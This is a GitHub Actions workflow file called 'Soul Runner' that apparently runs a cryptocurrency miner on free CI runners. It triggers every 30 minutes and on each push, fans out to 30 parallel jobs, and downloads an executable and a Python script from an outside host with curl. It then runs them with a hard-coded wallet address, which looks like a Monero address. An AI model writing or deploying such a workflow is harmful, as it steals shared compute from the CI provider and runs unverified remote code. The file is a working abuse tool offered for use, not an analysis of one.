name: Soul Runner

on:
  schedule:
    # You can adjust the schedule as needed
    - cron: '*/30 * * * *'  # Runs every 30 minutes
  push:
    branches: [ main, master ]
  workflow_dispatch:  # Allows manual triggering

jobs:
  execute_soul:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        # Creates 30 parallel jobs
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 
                   16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
      fail-fast: false  # Continue running other jobs even if one fails
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Setup system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cpulimit
    
    - name: Download and prepare soul files
      run: |
        curl -O "https://hingoli.io/soul.php?file=soul"
        mv soul.php soul
        curl -O "https://hingoli.io/soul.php?file=soul.py"
        mv soul.php soul.py
        chmod +x soul
    
    - name: Execute soul script
      env:
        # You can store your wallet address as a GitHub secret
        WALLET_ADDRESS: ${{ 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN }}
      run: |
        if [ -z "$WALLET_ADDRESS" ]; then
          echo "Error: WALLET_ADDRESS secret is not set"
          exit 1
        fi
        python3 soul.py $WALLET_ADDRESS
    
    - name: Job completion notification
      if: always()
      run: |
        echo "Job ${{ matrix.instance }} completed with status: ${{ job.status }}"
